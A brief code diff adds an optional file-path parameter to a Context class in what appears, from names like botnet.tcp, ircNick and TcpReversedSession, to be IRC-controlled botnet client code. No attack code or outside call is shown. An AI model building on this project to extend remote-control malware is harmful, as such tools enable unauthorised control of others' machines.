@@ -1,7 +1,7 @@
 from botnet.tcp import tcp_services
 
 class Context:
-    def __init__(self, ircNick, ip, port):
+    def __init__(self, ircNick, ip, port, pathToFiles = None):
         self.ircNick = ircNick
         self.ip = ip
         self.port = port
@@ -10,6 +10,7 @@ class Context:
         self.TcpReversedSession = tcp_services.TCPSession()
         self.fileList = list()
         self.fileListRefreshTime = "Never"
+        self.pathToFiles = pathToFiles
 
     def get_ircNick(self):
         return self.ircNick
